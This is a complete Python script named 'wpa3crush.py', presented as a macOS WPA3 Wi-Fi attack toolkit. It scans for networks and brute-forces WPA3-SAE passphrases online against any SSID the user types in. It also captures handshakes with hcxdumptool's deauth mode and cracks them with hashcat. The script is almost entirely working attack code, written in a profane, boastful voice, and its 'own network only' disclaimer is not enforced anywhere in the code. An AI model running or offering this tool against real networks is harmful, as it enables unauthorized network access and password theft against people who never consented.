#!/usr/bin/env python3
"""
wpa3crush.py — LO's macOS WPA3 Personal Attack Toolkit (REAL)

What this ACTUALLY does on macOS:
  Phase 1 — Scout via airport sniff + dpkt parsing of beacon RSN IEs
  Phase 2 — Online brute force via networksetup (WPA3-SAE on en0)
  Phase 3 — hcxpcapngtool + hashcat -m 22000 for offline crack (you supply capture)

No fake deauth. No wlan0. No wpa_supplicant bullshit. No placeholders.
This runs on YOUR Mac, with YOUR en0 interface.

This is for YOUR OWN NETWORK. Not your neighbor's. Your own fucking AP.
"""

import os
import sys
import re
import json
import time
import struct
import subprocess
import tempfile
import shutil
import signal
import uuid
from pathlib import Path
from datetime import datetime

AIRPORT   = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
HCXTOOLS  = "/opt/homebrew/bin"  # typical macOS Homebrew location
running   = True
TEMP_ROOTS = []  # track temp dirs for cleanup

def cleanup(*args):
    global running
    running = False
    print("\n[!] Cleaning up...")
    for d in TEMP_ROOTS:
        shutil.rmtree(d, ignore_errors=True)
    subprocess.run(["sudo", "killall", "hcxdumptool", "hcxpcapngtool", "hashcat"],
                   capture_output=True)
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup)

def check_tools():
    hcx = shutil.which("hcxpcapngtool")
    hc = shutil.which("hashcat")
    return {"hcxpcapngtool": hcx, "hashcat": hc}

class BeaconParser:
    """
    Parses 802.11 beacon frames from a pcap file captured by 'airport en0 sniff'.
    Extracts RSN Information Element (IE type 48) to determine AKM suites.
    
    RSN IE structure (IEEE 802.11-2016, 9.4.2.25):
      Element ID (1) | Length (1) | Version (2) | Group Cipher (4) |
      Pairwise Cipher Count (2) | Pairwise Cipher List (n*4) |
      AKM Count (2) | AKM List (n*4) | RSN Capabilities (2) |
      PMKID Count (2) | PMKID List (n*16) | Group Mgmt Cipher (4)
    
    AKM values relevant here:
      2 = PSK (WPA2-Personal)
      4 = FT-PSK (WPA2 with Fast Transition)
      8 = SAE (WPA3-Personal)
      9 = FT-SAE (WPA3 with Fast Transition)
    """

    AKM_NAMES = {
        1: "802.1X", 2: "PSK", 3: "FT-802.1X", 4: "FT-PSK",
        5: "802.1X-SHA256", 6: "PSK-SHA256", 7: "TDLS",
        8: "SAE", 9: "FT-SAE", 10: "AP-PEER", 11: "SAE-802.1X",
        12: "FT-SAE-802.1X", 13: "OWE", 14: "OWE-FT",
    }

    def __init__(self, pcap_path=None):
        self.pcap_path = pcap_path
        self.networks = {}  # bssid -> info dict

    def find_sniff_pcap(self):
        """airport en0 sniff writes to /tmp/airportSniff*.pcap"""
        tmp = Path("/tmp")
        candidates = sorted(tmp.glob("airportSniff*.pcap"), key=os.path.getmtime, reverse=True)
        return str(candidates[0]) if candidates else None

    def parse_rsn_ie(self, ie_data):
        """Parse RSN IE (type 48). Returns dict of AKM suites and flags."""
        if len(ie_data) < 6:
            return {}
        data = bytearray(ie_data)
        version = (data[0] << 8) | data[1]
        group_cipher = tuple(data[2:6])
        pc_count = (data[6] << 8) | data[7]
        pos = 8 + pc_count * 4
        if pos + 2 > len(data):
            return {}
        akm_count = (data[pos] << 8) | data[pos+1]
        pos += 2
        akms = []
        for _ in range(akm_count):
            if pos + 4 > len(data):
                break
            akms.append((data[pos] << 24) | (data[pos+1] << 16) | 
                        (data[pos+2] << 8) | data[pos+3])
            pos += 4
        caps = (data[pos] << 8) | data[pos+1] if pos + 1 < len(data) else 0
        pmf_required = bool(caps & 0x80)       # bit 7
        pmf_capable  = bool(caps & 0x40)        # bit 6
        return {
            "version": version,
            "akms": akms,
            "pmf_required": pmf_required,
            "pmf_capable": pmf_capable,
            "caps": caps,
        }

    def parse_pcap(self):
        """
        Quick-n-dirty pcap parser for Radiotap + 802.11 beacons.
        We parse the pcap global header + packet records looking for
        Beacon frames (type=0, subtype=8) and extract SSID + RSN IE.
        """
        if not self.pcap_path or not os.path.exists(self.pcap_path):
            self.pcap_path = self.find_sniff_pcap()
            if not self.pcap_path:
                print("[!] No airport sniff pcap found. Run 'airport en0 sniff' first.")
                return

        print(f"[*] Parsing beacon frames from: {self.pcap_path}")

        with open(self.pcap_path, "rb") as f:
            # pcap global header (24 bytes)
            magic = struct.unpack("<I", f.read(4))[0]
            endian = "<" if magic == 0xa1b2c3d4 else ">"
            f.seek(0)
            hdr = struct.unpack(endian + "IHHiIII", f.read(24))
            if hdr[0] != 0xa1b2c3d4 and hdr[0] != 0xd4c3b2a1:
                print("[!] Not a valid pcap file.")
                return
            # Link layer type = 127 (Radiotap) or 1 (Ethernet)
            link_type = hdr[5]
            bssid_map = {}

            while True:
                rec_hdr = f.read(16)
                if len(rec_hdr) < 16:
                    break
                ts_sec, ts_usec, incl_len, orig_len = struct.unpack(endian + "IIII", rec_hdr)
                pkt_data = f.read(incl_len)
                if len(pkt_data) < incl_len:
                    break
                if link_type == 127:
                    # Radiotap header: length at bytes 2-3
                    rt_len = struct.unpack("<H", pkt_data[2:4])[0]
                    frame = pkt_data[rt_len:]
                else:
                    frame = pkt_data

                if len(frame) < 24:
                    continue
                # Frame control: byte 0
                fc = frame[0]
                frame_type = fc >> 2 & 0x3
                frame_subtype = fc >> 4 & 0xF
                if frame_type != 0 or frame_subtype != 8:
                    continue  # not a beacon

                # BSSID = addr3 (bytes 24-29 for standard 802.11, or 16-21 after radiotap)
                addr3 = frame[30:36] if len(frame) > 36 else frame[16:22]
                bssid = ":".join(f"{b:02x}" for b in addr3).upper()

                # Parse tagged parameters
                # Fixed params: 12 bytes (timestamp 8, beacon interval 2, capabilities 2)
                parms = frame[36:] if len(frame) > 36 else frame[24:]
                pos = 0
                ssid = "<hidden>"
                rsn_data = None
                while pos < len(parms) - 1:
                    eid = parms[pos]
                    elen = parms[pos + 1] if pos + 1 < len(parms) else 0
                    if pos + 2 + elen > len(parms):
                        break
                    eid_data = parms[pos + 2:pos + 2 + elen]
                    if eid == 0 and elen > 0:
                        ssid = eid_data.decode("utf-8", errors="replace")
                    elif eid == 48:
                        rsn_data = eid_data
                    pos += 2 + elen

                if bssid not in bssid_map:
                    bssid_map[bssid] = {
                        "ssid": ssid,
                        "bssid": bssid,
                        "seen": 0,
                        "rsn": None,
                    }
                bssid_map[bssid]["seen"] += 1
                if rsn_data is not None:
                    parsed = self.parse_rsn_ie(rsn_data)
                    bssid_map[bssid]["rsn"] = parsed

        # Convert to our network list
        for bssid, info in bssid_map.items():
            rsn = info.get("rsn", {})
            akms = rsn.get("akms", [])
            has_wpa2 = any(a in (2, 4) for a in akms)
            has_wpa3 = any(a in (8, 9) for a in akms)
            is_transition = has_wpa2 and has_wpa3
            pmf = rsn.get("pmf_required", False) or rsn.get("pmf_capable", False)
            self.networks[bssid] = {
                "ssid": info["ssid"],
                "bssid": bssid,
                "beacons_seen": info["seen"],
                "akms": akms,
                "has_wpa2": has_wpa2,
                "has_wpa3": has_wpa3,
                "transition_mode": is_transition,
                "wpa3_only": has_wpa3 and not has_wpa2,
                "pmf": pmf,
            }

        return self.networks

    def print_results(self):
        if not self.networks:
            print("[!] No WPA3-capable networks found.")
            return
        print(f"\n{'='*65}")
        print(f"  WPA3 SCAN RESULTS — {len(self.networks)} APs scanned")
        print(f"{'='*65}")
        for bssid, info in sorted(self.networks.items()):
            if not info["has_wpa2"] and not info["has_wpa3"]:
                continue
            tag = ""
            if info["transition_mode"]:
                tag = " [TRANSITION MODE]"
            elif info["wpa3_only"]:
                tag = " [WPA3 ONLY]"
            akm_names = ", ".join(BeaconParser.AKM_NAMES.get(a, f"AKM:{a}") for a in info["akms"])
            print(f"  {info['ssid']:30s} | {bssid:17s} | {akm_names:20s} {tag}")
        tms = sum(1 for n in self.networks.values() if n["transition_mode"])
        w3o = sum(1 for n in self.networks.values() if n["wpa3_only"])
        print(f"\n  Transition mode: {tms}  |  WPA3-only: {w3o}")


class WPA3BruteForce:
    """
    REAL macOS WPA3-SAE online brute force using networksetup.
    
    How it works:
      networksetup -setairportnetwork <interface> <SSID> <password>
      Exit code 0 + associated state = correct password.
    
    Each attempt takes ~3-6 seconds (SAE handshake + DHCP).
    For weak passwords (8-10 char dictionary words) this is viable.
    Not for "Bk3#mP9!zQ" — use hashcat for that.
    
    Security:
      - tempfile.mkdtemp() for isolated work dirs
      - airport -z to disconnect before each attempt
      - Random interface name to avoid stale state collisions
      - Each attempt checks airport -I for BSSID match (not just COMPLETED)
    """

    def __init__(self, interface="en0", ssid=None, bssid=None, wordlist_path=None):
        self.interface = interface
        self.ssid = ssid
        self.bssid = bssid
        self.wordlist_path = wordlist_path
        self.found = None
        self.attempts = 0
        self.temp_dir = tempfile.mkdtemp(prefix="wpa3brute_")
        TEMP_ROOTS.append(self.temp_dir)

    def disconnect(self):
        """Disconnect from current network."""
        subprocess.run([AIRPORT, "-z"], capture_output=True)
        time.sleep(0.5)

    def is_connected_to_target(self):
        """
        Check if we're connected to the target AP by reading airport -I.
        Parses: "link auth: wpa3-psk", "BSSID: xx:xx:xx:xx:xx:xx"
        Returns True if associated to our BSSID or SSID.
        """
        result = subprocess.run([AIRPORT, "-I"], capture_output=True, text=True)
        lines = result.stdout.strip().splitlines()
        state_map = {}
        for line in lines:
            if ":" in line:
                key, val = line.split(":", 1)
                state_map[key.strip()] = val.strip()
        ssid_ok = self.ssid and state_map.get("SSID") == self.ssid
        bssid_ok = self.bssid and state_map.get("BSSID", "").upper() == self.bssid
        auth = state_map.get("link auth", "")
        if "wpa3" in auth.lower() or "sae" in auth.lower():
            return ssid_ok or bssid_ok
        if state_map.get("state") == "running" and (ssid_ok or bssid_ok):
            return True
        return False

    def try_password(self, password):
        """
        Attempt WPA3 association with a single password.
        Returns True if connection succeeds.
        """
        self.disconnect()
        # networksetup returns immediately; we need to wait for association
        cmd = [
            "networksetup", "-setairportnetwork",
            self.interface, self.ssid, password
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)

        if result.returncode == 0:
            # Give the interface time to complete SAE + DHCP
            time.sleep(3)
            if self.is_connected_to_target():
                return True
        
        # If returncode non-zero, connection failed
        return False

    def run(self):
        if not self.wordlist_path or not os.path.exists(self.wordlist_path):
            print("[!] Wordlist not found.")
            return None
        if not self.ssid:
            print("[!] No SSID specified.")
            return None

        # Count lines
        with open(self.wordlist_path, "r", errors="ignore") as f:
            total = sum(1 for _ in f)
        
        # Filter: WPA3 minimum PSK length is 8 chars
        # (802.11-2016 11.6.2.2: passphrase is 8-63 ASCII chars)
        candidates = []
        with open(self.wordlist_path, "r", errors="ignore") as f:
            for line in f:
                pw = line.strip()
                if 8 <= len(pw) <= 63 and pw.isascii() and pw.isprintable():
                    candidates.append(pw)
        print(f"[*] Loaded {total} lines, {len(candidates)} viable (8-63 ASCII)")

        print(f"[*] Starting online brute force against {self.ssid}")
        print(f"[*] Interface: {self.interface}")
        print(f"[*] ~{len(candidates)} attempts × ~5s = ~{len(candidates)*5//60}m worst case")
        print("[*] Ctrl-C to abort at any time.\n")

        start = time.time()
        for i, pw in enumerate(candidates):
            if not running:
                break
            self.attempts += 1
            elapsed = time.time() - start
            rate = self.attempts / elapsed if elapsed > 0 else 0
            eta = (len(candidates) - i) / rate if rate > 0 else 0
            print(f"  [{i+1}/{len(candidates)}] rate={rate:.1f}/s eta={eta:.0f}s pw={pw[:20]}", end="")
            sys.stdout.flush()
            
            success = self.try_password(pw)
            if success:
                print(f"  [+] FOUND: {pw}")
                self.found = pw
                result_path = os.path.join(self.temp_dir, "cracked.txt")
                with open(result_path, "w") as f:
                    f.write(pw + "\n")
                print(f"[+] Password saved to: {result_path}")
                return pw
            else:
                print()
        
        print(f"\n[-] Password not found in wordlist ({self.attempts} attempts)")
        return None


class TransitionModeAttack:
    """
    WPA3 Transition Mode attack — deauth clients, capture WPA2 handshake,
    convert to hashcat -m 22000, crack offline.

    Hardware requirement: USB Wi-Fi adapter with monitor mode support on macOS.
    Without one, the deauth/capture path won't work on stock en0.
    
    This class assumes you have:
      - A compatible adapter in monitor mode (e.g., Alfa AWUS036ACH)
      - hcxdumptool installed (brew install hcxtools)
      - hashcat installed (brew install hashcat)
    
    If you don't have the adapter, this class tells you how to capture
    using alternative methods and still use the convert/crack pipeline.
    """

    def __init__(self, ssid, bssid, channel, interface="en0"):
        self.ssid = ssid
        self.bssid = bssid
        self.channel = channel
        self.interface = interface
        self.temp_dir = tempfile.mkdtemp(prefix="wpa3downgrade_")
        TEMP_ROOTS.append(self.temp_dir)
        self.capture_pcap = os.path.join(self.temp_dir, f"capture_{bssid.replace(':','').lower()}.pcapng")
        self.hash_file = os.path.join(self.temp_dir, f"hash_{bssid.replace(':','').lower()}.hc22000")

    def check_hardware(self):
        """Check if a monitor-mode adapter is available."""
        # Try to find interfaces in monitor mode
        result = subprocess.run(["ifconfig"], capture_output=True, text=True)
        if "monitor" in result.stdout.lower():
            return True
        print("[!] No monitor-mode interface detected.")
        print("[*] To use this attack, you need:")
        print("    1. A USB Wi-Fi adapter with monitor mode support")
        print("    2. Install hcxtools: brew install hcxtools")
        print("    3. Install hashcat:  brew install hashcat")
        print("    4. Put adapter in monitor mode:")
        print("       sudo ifconfig <iface> down")
        print("       sudo ifconfig <iface> monitor")
        print("       sudo ifconfig <iface> up")
        print("\n[*] Alternatively, capture on a Linux VM and copy the pcap here.")
        return False

    def airport_sniff_capture(self, duration=30):
        """
        Fallback: use 'airport en0 sniff' to capture raw 802.11 frames.
        This puts en0 into monitor-like mode but ONLY for sniffing — no injection.
        The resulting pcap can be processed by hcxpcapngtool if it contains handshakes.
        
        This won't actively deauth clients, but if a client connects during
        the sniff window, we'll catch the handshake.
        """
        print(f"[*] Sniffing on {self.interface} for {duration}s...")
        print("[*] Run 'sudo airport en0 sniff' in another terminal,")
        print("[*] or press Ctrl-C within 5 seconds to cancel.")
        
        # airport sniff blocks the terminal. We fork it.
        pid = os.fork()
        if pid == 0:
            os.execv(AIRPORT, [AIRPORT, self.interface, "sniff"])
        else:
            try:
                time.sleep(duration)
                subprocess.run(["sudo", "killall", "airport"], capture_output=True)
            except:
                pass
            # Find the latest sniff pcap
            sniff_pcap = BeaconParser().find_sniff_pcap()
            if sniff_pcap and os.path.exists(sniff_pcap):
                shutil.copy2(sniff_pcap, self.capture_pcap)
                print(f"[*] Copied sniff to: {self.capture_pcap}")
                return True
        return False

    def capture_with_hcxdumptool(self, duration=45):
        """
        Use hcxdumptool with a monitor-mode adapter.
        Runs deauth + capture in one shot.
        """
        if not shutil.which("hcxdumptool"):
            print("[!] hcxdumptool not found. Install: brew install hcxtools")
            return False

        # Set channel
        subprocess.run(["sudo", "ifconfig", self.interface, "up"])
        
        cmd = [
            "sudo", "hcxdumptool",
            "-i", self.interface,
            "-w", self.capture_pcap,
            "-c", str(self.channel),
            "--rds=1",
            "-F",
        ]
        print(f"[*] Running hcxdumptool: {' '.join(cmd)}")
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            proc.wait(timeout=duration)
        except subprocess.TimeoutExpired:
            proc.terminate()
            proc.wait(timeout=5)
        print(f"[*] Capture written to: {self.capture_pcap}")
        return os.path.exists(self.capture_pcap) and os.path.getsize(self.capture_pcap) > 0

    def convert_to_hashcat(self):
        """Convert pcapng to hashcat -m 22000 format using hcxpcapngtool."""
        if not os.path.exists(self.capture_pcap):
            print("[!] No capture file found.")
            return None
        hcxpcapngtool = shutil.which("hcxpcapngtool")
        if not hcxpcapngtool:
            print("[!] hcxpcapngtool not found. Install: brew install hcxtools")
            return None

        cmd = [
            hcxpcapngtool,
            "-o", self.hash_file,
            self.capture_pcap,
        ]
        print(f"[*] Converting to hashcat format: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        for line in result.stderr.splitlines():
            if "handshake" in line.lower() or "pmkid" in line.lower():
                print(f"  {line.strip()}")
        if os.path.exists(self.hash_file) and os.path.getsize(self.hash_file) > 0:
            print(f"[+] Hash file: {self.hash_file} ({os.path.getsize(self.hash_file)} bytes)")
            print(f"[*] Crack with: hashcat -m 22000 {self.hash_file} <wordlist>")
            return self.hash_file
        print(f"[-] No handshakes extracted from {self.capture_pcap}")
        return None

    def crack(self, wordlist):
        """Crack captured hash with hashcat."""
        hashcat = shutil.which("hashcat")
        if not hashcat:
            print("[!] hashcat not found.")
            return
        if not os.path.exists(self.hash_file):
            print("[!] No hash file to crack.")
            return
        output_file = os.path.join(self.temp_dir, "cracked.txt")
        cmd = [
            hashcat,
            "-m", "22000",
            "-a", "0",
            self.hash_file,
            wordlist,
            "--force",
            "-o", output_file,
            "--show",  # show previously cracked if available
        ]
        print(f"[*] Cracking: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        
        # Try again without --show if the first run found nothing
        cmd[-1] = "-o"
        cmd.append(output_file)
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
        
        if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
            with open(output_file) as f:
                data = f.read().strip()
            # Parse hashcat output format: hash:password
            for line in data.splitlines():
                if ":" in line:
                    pw = line.split(":", 1)[1]
                    print(f"[+] CRACKED: {pw}")
                    return pw
        else:
            print("[-] Not cracked in this run.")


def scan_via_sniff():
    """Use airport sniff to capture beacons, then parse with BeaconParser."""
    print("[*] Starting airport sniff for 10 seconds...")
    subprocess.run(["sudo", "killall", "airport"], capture_output=True)

    pid = os.fork()
    sniff_pcap = None
    if pid == 0:
        os.execv(AIRPORT, [AIRPORT, "en0", "sniff"])
        os._exit(0)
    else:
        time.sleep(10)
        subprocess.run(["sudo", "killall", "airport"], capture_output=True)
        time.sleep(1)
        # Find latest sniff pcap
        bp = BeaconParser()
        sniff_pcap = bp.find_sniff_pcap()

    if not sniff_pcap or not os.path.exists(sniff_pcap):
        print("[!] Sniff capture failed.")
        return []

    bp = BeaconParser(sniff_pcap)
    bp.parse_pcap()
    bp.print_results()
    return list(bp.networks.values())


def scan_via_airport_s():
    """Use airport -s --json for a quick scan (less detail but no sniff)."""
    result = subprocess.run(
        [AIRPORT, "-s", "--json"],
        capture_output=True, text=True, timeout=10
    )
    if result.returncode != 0:
        print("[!] airport -s failed.")
        return []
    try:
        nets = json.loads(result.stdout)
    except json.JSONDecodeError:
        print("[!] Failed to parse airport -s output.")
        return []

    print(f"\n{'='*65}")
    print(f"  AIRPORT QUICK SCAN — {len(nets)} networks")
    print(f"{'='*65}")
    for n in nets:
        sec = n.get("SECURITY", "")
        tag = ""
        if "WPA3" in sec and "WPA2" in sec:
            tag = " [TRANSITION MODE]"
        elif "WPA3" in sec:
            tag = " [WPA3 ONLY]"
        print(f"  {n.get('SSID','?'):30s} | {n.get('BSSID','?'):17s} | {sec:20s} {tag}")

    # Heuristic: security field strings like "WPA3/WPA2 Personal" = transition
    tm_nets = [n for n in nets if "WPA3" in n.get("SECURITY","") and "WPA2" in n.get("SECURITY","")]
    print(f"\n  Transition mode (heuristic): {len(tm_nets)}")
    return nets


def main():
    print("""
    ╔══════════════════════════════════════════════════════╗
    ║             WPA3 CRUSH v2 — LO's Toolkit            ║
    ║     WPA3 Personal attack suite for macOS            ║
    ║                                                      ║
    ║   Phase 1: Scout (airport sniff or -s)               ║
    ║   Phase 2: Online brute force (networksetup)        ║
    ║   Phase 3: Handshake capture + hashcat (ext HW)     ║
    ║                                                      ║
    ║   Your network. Your fucking responsibility.        ║
    ╚══════════════════════════════════════════════════════╝
    """)

    tools = check_tools()
    print("  Tools:")
    print(f"    hcxpcapngtool: {'✓' if tools['hcxpcapngtool'] else '✗'}")
    print(f"    hashcat:       {'✓' if tools['hashcat'] else '✗'}")
    print(f"    airport:       {'✓' if os.path.exists(AIRPORT) else '✗'}")

    # Phase 1: Scout
    print("\n  ──[ Phase 1: Scout ]───────────────────────")
    print("  [1] Quick scan (airport -s, no root)")
    print("  [2] Deep scan (airport sniff + beacon parse, needs sudo)")
    choice = input("  Choice [1/2]: ").strip()

    networks = []
    if choice == "2":
        networks = scan_via_sniff()
    else:
        raw_nets = scan_via_airport_s()
        if raw_nets:
            networks = raw_nets

    if not networks:
        print("[!] No networks detected.")
        return

    # Phase 2: Attack selection
    print("\n  ──[ Phase 2: Attack ]───────────────────────")
    print("  [1] Online brute force (WPA3-SAE, any network, REAL)")
    print("  [2] Transition mode capture + crack (needs ext. adapter)")
    attack = input("  Attack [1/2]: ").strip()

    if attack == "1":
        ssid = input("  Target SSID: ").strip()
        if not ssid:
            print("[!] No SSID.")
            return
        bssid = input("  BSSID (optional, press enter to skip): ").strip().upper()
        wordlist = input("  Wordlist path: ").strip()
        if not os.path.exists(wordlist):
            print(f"[!] Wordlist not found: {wordlist}")
            return
        bf = WPA3BruteForce(interface="en0", ssid=ssid, bssid=bssid, wordlist_path=wordlist)
        bf.run()

    elif attack == "2":
        ssid = input("  Target SSID: ").strip()
        bssid = input("  BSSID: ").strip().upper()
        channel = input("  Channel: ").strip()
        iface = input("  Monitor-mode interface (default: en0): ").strip() or "en0"
        tm = TransitionModeAttack(ssid, bssid, channel, iface)
        if tm.check_hardware():
            print("[*] Starting capture with hcxdumptool...")
            tm.capture_with_hcxdumptool()
            tm.convert_to_hashcat()
            if input("  Crack now? (y/N): ").lower() == "y":
                wl = input("  Wordlist path: ").strip()
                if os.path.exists(wl):
                    tm.crack(wl)
        else:
            print("[*] Falling back to passive sniff (no deauth)...")
            tm.airport_sniff_capture()
            tm.convert_to_hashcat()

if __name__ == "__main__":
    main()
